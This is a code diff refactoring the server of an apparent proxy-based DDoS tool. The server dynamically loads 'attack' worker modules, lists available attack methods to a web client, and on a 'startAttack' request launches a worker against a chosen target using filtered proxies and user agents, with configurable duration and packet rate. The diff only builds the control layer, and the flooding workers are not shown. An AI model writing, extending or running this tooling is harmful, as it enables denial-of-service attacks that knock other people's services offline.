@@ -1,5 +1,5 @@
 import express from "express";
-import { readFileSync, writeFileSync, readdirSync } from "fs";
+import { existsSync, readdirSync, readFileSync, writeFileSync } from "fs";
 import { createServer } from "http";
 import { dirname, join } from "path";
 import { Server } from "socket.io";
@@ -8,39 +8,13 @@ import { Worker } from "worker_threads";
 
 import bodyParser from "body-parser";
 import { currentPath, loadProxies, loadUserAgents } from "./fileLoader";
-import { AttackMethod } from "./lib";
-import { filterProxies } from "./proxyUtils";
+import { normalizeProxy } from "./proxyUtils";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = dirname(__filename);
 const __prod = process.env.NODE_ENV === "production";
 
-// Define the workers based on attack type
-const attackWorkers: Record<string, string> = {};
-const attackMethods: any[] = [];
-const workersDir = join(__dirname, "workers");
 
-try {
-  const files = readdirSync(workersDir);
-  for (const file of files) {
-    if (file.endsWith("Attack.js")) {
-      const filePath = join(workersDir, file);
-      const fileUrl = pathToFileURL(filePath).href;
-      const module = await import(fileUrl);
-
-      if (module.info) {
-        attackWorkers[module.info.id] = `./workers/${file}`;
-        attackMethods.push(module.info);
-      }
-    }
-  }
-  console.log(
-    "Loaded workers:",
-    attackMethods.map((m) => m.name)
-  );
-} catch (error) {
-  console.error("Error loading workers:", error);
-}
 
 const app = express();
 const httpServer = createServer(app);
@@ -58,6 +32,32 @@ const userAgents = loadUserAgents();
 console.log("Proxies loaded:", proxies.length);
 console.log("User agents loaded:", userAgents.length);
 
+// Dynamic worker loading
+const attackWorkers: Record<string, string> = {};
+const availableAttacks: any[] = [];
+
+const loadWorkers = async () => {
+  const workersDir = join(__dirname, "workers");
+  if (existsSync(workersDir)) {
+    const files = readdirSync(workersDir).filter((file) => file.endsWith(".js"));
+    for (const file of files) {
+      try {
+        const filePath = join(workersDir, file);
+        const moduleUrl = pathToFileURL(filePath).href;
+        const module = await import(moduleUrl);
+        
+        if (module.info) {
+          attackWorkers[module.info.id] = filePath;
+          availableAttacks.push(module.info);
+          console.log(`Loaded worker: ${module.info.name} (${module.info.id})`);
+        }
+      } catch (err) {
+        console.error(`Failed to load worker ${file}:`, err);
+      }
+    }
+  }
+};
+
 app.use(express.static(join(__dirname, "public")));
 
 io.on("connection", (socket) => {
@@ -69,25 +69,37 @@ io.on("connection", (socket) => {
     totalPackets: 0,
     log: "🍤 Connected to the server.",
   });
+  
+  // Send available attacks to client
+  socket.emit("attacks", availableAttacks);
+
+  socket.on("getAttacks", () => {
+    socket.emit("attacks", availableAttacks);
+  });
 
   socket.on("startAttack", (params) => {
     const { target, duration, packetDelay, attackMethod, packetSize } = params;
-    const filteredProxies = filterProxies(proxies, attackMethod);
+    
     const attackWorkerFile = attackWorkers[attackMethod];
+    const attackInfo = availableAttacks.find((a) => a.id === attackMethod);
 
-    if (!attackWorkerFile) {
+    if (!attackWorkerFile || !attackInfo) {
       socket.emit("stats", {
         log: `❌ Unsupported attack type: ${attackMethod}`,
       });
       return;
     }
 
+    const filteredProxies = proxies
+      .map(normalizeProxy)
+      .filter((proxy) => attackInfo.supportedProtocols.includes(proxy.protocol));
+
     socket.emit("stats", {
       log: `🍒 Using ${filteredProxies.length} filtered proxies to perform attack.`,
       bots: filteredProxies.length,
     });
 
-    const worker = new Worker(join(__dirname, attackWorkerFile), {
+    const worker = new Worker(attackWorkerFile, {
       workerData: {
         target,
         proxies: filteredProxies,
@@ -133,7 +145,7 @@ io.on("connection", (socket) => {
 app.get("/methods", (req, res) => {
   res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
   res.setHeader("Content-Type", "application/json");
-  res.send(attackMethods);
+  res.send(availableAttacks);
 });
 
 app.get("/configuration", (req, res) => {
@@ -181,12 +193,14 @@ app.post("/configuration", bodyParser.json(), (req, res) => {
 });
 
 const PORT = parseInt(process.env.PORT || "3000");
-httpServer.listen(PORT, () => {
-  if (__prod) {
-    console.log(
-      `(Production Mode) Client and server is running under http://localhost:${PORT}`
-    );
-  } else {
-    console.log(`Server is running under development port ${PORT}`);
-  }
+loadWorkers().then(() => {
+  httpServer.listen(PORT, () => {
+    if (__prod) {
+      console.log(
+        `(Production Mode) Client and server is running under http://localhost:${PORT}`
+      );
+    } else {
+      console.log(`Server is running under development port ${PORT}`);
+    }
+  });
 });
